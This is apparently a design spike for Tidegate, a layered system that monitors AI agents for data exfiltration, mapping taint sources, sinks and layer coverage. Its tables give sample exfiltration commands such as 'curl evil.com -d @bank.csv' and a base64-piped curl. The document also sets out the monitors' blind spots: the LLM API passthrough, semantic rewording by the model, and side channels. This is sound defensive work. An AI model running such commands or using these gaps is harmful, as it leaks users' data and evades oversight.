---
title: "SPIKE-009: Data Flow Taint Model"
status: Complete
author: cristos
created: 2026-02-23
last_updated: 2026-02-23
question: "How does sensitive data move through the system, and do we need an explicit taint model?"
parent: VISION-001
---

# Data Flow Taint Model

## Lifecycle

| Phase | Date | Commit | Notes |
|-------|------|--------|-------|
| Planned | 2026-02-23 | 138d920 | Input/output channels first enumerated during L1 coverage gap spike |
| Active | 2026-02-23 | — | Promoted from L1 spike; recognized as foundational to entire architecture |
| Complete | 2026-02-23 | — | Findings formalized as ADR-002 (taint-and-verify data flow model) |

## Source

Emerged during investigation of `l1-interpreter-coverage-gap.md`. The L1 spike asked "does seccomp-notify miss in-process execution?" and the investigation revealed a more fundamental question: what are ALL the data paths through the system, and which layer is responsible for each?

## Question

How does sensitive data move through a Tidegate-managed agent system? Where does it enter, how does it transform, where does it exit, and at what points can we intercept it? Do we need an explicit taint model — tracking data provenance from acquisition to exfiltration — to reason about coverage?

## Why this is foundational

The three-layer architecture (seccomp-notify, MCP gateway, agent-proxy) was designed around interception points, not data flows. Each layer was designed independently:
- L1 intercepts `execve` and analyzes commands
- L2 scans MCP tool call parameters
- L3 scans skill HTTP traffic

But the threat is a **data flow**: sensitive data enters the agent's reach through an input channel, possibly transforms, and exits through an output channel. The layers need to be reasoned about in terms of which input→output pairs they cover, not just which protocol they sit on.

---

## Taint sources (acquisition channels)

How sensitive data enters the agent's reach:

| Channel | Example | What sees it arrive? |
|---|---|---|
| **Workspace files** | Agent reads `bank.csv` via Bash (`cat`) or in-process (`fs.readFileSync`) | L1: tg-scanner reads the file independently. L1+: eBPF sees `openat`/`read` |
| **MCP server responses** | Slack MCP returns channel messages containing an API key | L2: gateway scans response values |
| **Conversation context** | User pastes credentials into chat | None (already in agent memory) |
| **Agent memory** | Previously poisoned memory contains sensitive data | None (internal to agent framework) |
| **Environment variables** | LLM API key (the one credential in agent container) | L1: tg-scanner can see `execve` with env inheritance |
| **HTTP responses** | Skill fetches a webpage containing PII | L3: agent-proxy scans response bodies |
| **Child process stdout** | `cat /etc/passwd` output captured by the agent | L1: tg-scanner analyzes the command before execution |
| **/proc filesystem** | Agent reads `/proc/self/environ` or other process info | L1: tg-scanner sees the command. L1+: eBPF sees the `openat`/`read` |

### Untainted acquisition

Not all acquisition is dangerous. The agent reading its own source code, fetching documentation, or receiving non-sensitive MCP responses are normal operations. **Taint should be data-driven, not channel-driven** — the file `/workspace/README.md` is not tainted; `/workspace/bank.csv` is.

How does tg-scanner (or any layer) know what's sensitive? By scanning the content. This is the scanner's role: `{value} → {allow, reason}`. Data is tainted if the scanner says deny.

---

## Taint sinks (exfiltration channels)

How data exits the agent's reach:

| Channel | Example | What checks the exit? |
|---|---|---|
| **MCP tool call parameters** | `post_message(text: <sensitive data>)` | **L2** (gateway scans all parameter values) |
| **Skill HTTP requests** | `fetch("https://api.slack.com", {body: <sensitive data>})` | **L3** (agent-proxy MITM, scans request body) |
| **LLM API requests** | Agent sends sensitive data as part of conversation to Claude API | **Nothing** (CONNECT passthrough, no MITM). Residual risk. |
| **Bash → network** | `curl evil.com -d @bank.csv` | **L1** (tg-scanner blocks). **L3** (agent-proxy blocks unauthorized domain) |
| **Bash → encoding → network** | `base64 bank.csv | curl ...` | **L1** (tg-scanner detects encoding pattern + sensitive file) |
| **Filesystem writes** | Agent writes sensitive data to `/workspace/exfil.txt` (later read by another channel) | Staging, not exfiltration. Becomes a taint source for the next operation. |
| **DNS queries** | Encode data as DNS labels | **Docker network** (internal network, no DNS to external). Residual risk if Docker DNS config allows it. |
| **Timing/side channels** | Vary response time based on data bits | **Nothing**. Residual risk. Impractical for bulk data. |

---

## Taint propagation

This is where it gets interesting. In traditional taint tracking (Perl, Java), taint propagates through variable assignment and function calls. In Tidegate's architecture, taint propagates through three distinct mechanisms:

### 1. Syntactic propagation (trackable)

Data moves byte-for-byte or with known transformations:
- Agent reads file → file content enters process memory
- Script pipes file content through `base64` → content is encoded but structurally traceable
- Process writes to network socket → data exits

**Who tracks this**: L1 (tg-scanner analyzes command pipelines) and L1+ (eBPF correlates file read with network write at PID level).

### 2. Protocol propagation (scannable)

Data moves through a protocol boundary where we can inspect it:
- Agent passes file content as MCP tool call parameter
- Agent includes data in HTTP request body
- MCP server returns data in response

**Who tracks this**: L2 (MCP gateway) and L3 (agent-proxy) scan values at protocol boundaries. This is where pattern-based detection (Luhn, credential prefixes, etc.) operates.

### 3. Semantic propagation (opaque)

Data is transformed through the LLM:
- Agent reads `bank.csv` containing credit card numbers
- Content enters conversation context
- LLM produces: "The customer's card ending in 4242 was charged $500"
- Agent passes this natural-language summary through an MCP tool call

**Who tracks this**: Nobody. The LLM is a semantic taint propagator — it transforms structured sensitive data into natural language that doesn't match syntactic patterns. L2 might catch the card fragment "4242" if it's long enough for a Luhn check, but a summary like "John's account shows a $500 charge" is invisible to pattern matching.

**This is the fundamental limit of pattern-based detection.** Acknowledged in the threat model as an undetectable category. No amount of eBPF, seccomp-notify, or gateway scanning fixes this — it requires either (a) LLM-level awareness of what data is sensitive, or (b) preventing the sensitive data from entering the conversation context in the first place.

---

## Input × Output matrix: layer coverage

Each cell shows which layer(s) can detect data flowing from that input to that output.

| | MCP tool params | Skill HTTP | LLM API | Bash→network | Filesystem write |
|---|---|---|---|---|---|
| **Workspace files** | L1 (file scan) + L2 (pattern) | L1 (file scan) + L3 (pattern) | **L1 only** (file scan) | **L1** (command analysis) | No exfil (staging) |
| **MCP responses** | **L2** (scans both directions) | L3 (pattern) | — | L1 (if piped through command) | No exfil |
| **Conversation context** | L2 (pattern, limited) | L3 (pattern, limited) | — | L1 (command analysis) | No exfil |
| **Agent memory** | L2 (pattern, limited) | L3 (pattern, limited) | — | L1 (command analysis) | No exfil |
| **HTTP responses** | L2 (pattern) | **L3** (scans both directions) | — | L1 (if piped) | No exfil |
| **Env vars** | L2 (pattern, credential prefix) | L3 (pattern) | — | **L1** (sees env in execve) | No exfil |

### Reading the matrix

- **Bold** = primary layer for that pair (designed to catch it)
- (pattern) = relies on output-side pattern matching (works for syntactic, fails for semantic propagation)
- (file scan) = L1 can independently read the source file and scan its contents (catches pre-encoding)
- — = LLM API is CONNECT passthrough, no content inspection
- "No exfil" = filesystem writes are staging, not exfiltration; they become a taint source for the next operation

### Key findings

1. **L1 (seccomp-notify + tg-scanner) is the only layer that can inspect the source before transformation.** By reading workspace files independently, tg-scanner knows what sensitive data the script can reach, regardless of what the script does with it. This is why L1 is load-bearing for encode-before-exfil.

2. **L2 and L3 scan the output, not the source.** They catch sensitive data that arrives at protocol boundaries still in recognizable form. They're blind to encoded or semantically transformed data.

3. **LLM API is a blind spot for all layers.** The agent-proxy does CONNECT passthrough for LLM domains (can't MITM the LLM API). Data sent to the LLM is uninspected. This is a residual risk mitigated by: the agent can't usefully exfiltrate to an LLM API (it would need to extract the data from the LLM's response later, which flows back through L2).

4. **Each layer is PRIMARY for different input-output pairs.** They're not three redundant output scanners. L1 is primary for workspace→anything. L2 is primary for MCP→MCP circular flows. L3 is primary for HTTP→HTTP flows.

5. **Semantic propagation defeats all layers.** Data that passes through the LLM and emerges as natural language is undetectable by any pattern-based system. The only defense is preventing the data from entering the LLM context — which is what L1's file content scanning partially achieves (block the command that would have read the sensitive file).

---

## Do we need explicit taint tracking?

### What we have now (implicit)

Each layer independently scans values at its boundary. No shared state between layers. tg-scanner doesn't tell L2 "I saw the agent read bank.csv." L2 doesn't tell L3 "I blocked a Slack message containing a credit card number."

### What explicit taint tracking would add

**Process-level taint** (via eBPF): Tag PIDs that have accessed sensitive files. Enforce restrictions on tainted PIDs (block network writes, require L2 scanning of MCP calls from tainted contexts).

**Session-level taint** (via gateway state): If the agent has read a sensitive file in this session, escalate scanning sensitivity for subsequent MCP tool calls. This doesn't require eBPF — the gateway could track which files the agent has accessed (from audit logs or tg-scanner notifications).

**Cross-layer taint sharing**: tg-scanner flags "agent accessed sensitive file" → gateway increases scrutiny on this session's MCP calls → agent-proxy increases scrutiny on this session's HTTP calls. Requires a shared taint bus or event stream.

### Tradeoffs

| Approach | Coverage gain | Complexity | Implementation |
|---|---|---|---|
| Independent layers (current) | Baseline | Low | Already built (L2), designed (L1, L3) |
| Process-level taint (eBPF) | Catches in-process file read → network write | Medium | Tetragon TracingPolicy |
| Session-level taint (gateway state) | Escalated scanning after sensitive file access | Medium | Shared state between tg-scanner and gateway |
| Cross-layer taint bus | Full correlation across all layers | High | New infrastructure (event stream, shared state) |

### Recommendation (emerging)

**Start with independent layers + process-level taint.** The current architecture (each layer scans independently) already provides strong coverage. Process-level taint via Tetragon eBPF (the L1+ role from the coverage gap spike) adds the most valuable new capability: correlating file reads with network writes across execution models.

Session-level and cross-layer taint sharing are valuable but add complexity that isn't justified until the base layers are implemented and battle-tested. Design the audit log format to support future correlation (include PID, session ID, file paths, timestamps) so that taint tracking can be added without architectural changes.

---

## Open questions

- **Taint granularity**: Process-level (PID that read sensitive file) vs. file-level (specific file was sensitive) vs. content-level (specific credit card number was in the file). Process-level is easiest; content-level is most useful for avoiding false positives.
- **Taint decay**: How long does a process stay tainted? Until exit? For a time window? LLM context windows mean the data persists in the agent's memory across tool calls within a session.
- **Legitimate file access**: Agent reads `bank.csv` to summarize it for the user (legitimate), then later calls an MCP tool. Process-level taint would flag the MCP call even though the tool parameters don't contain bank data. How to avoid false-positive enforcement?
- **Taint through the LLM**: The LLM is a black-box taint propagator. If the agent read a sensitive file 10 turns ago, is the current MCP call "tainted"? Context window limits provide natural taint decay, but within the window, we can't know what the LLM retained.
- **Cross-session taint**: Agent memory persists across sessions. A sensitive file read in session 1 could influence MCP calls in session 2 via poisoned memory. Related to the `agent-memory-exfiltration.md` spike.
- **Implementation priority**: Is explicit taint tracking needed before the base layers are implemented, or is it a refinement to add after L1/L2/L3 are operational?
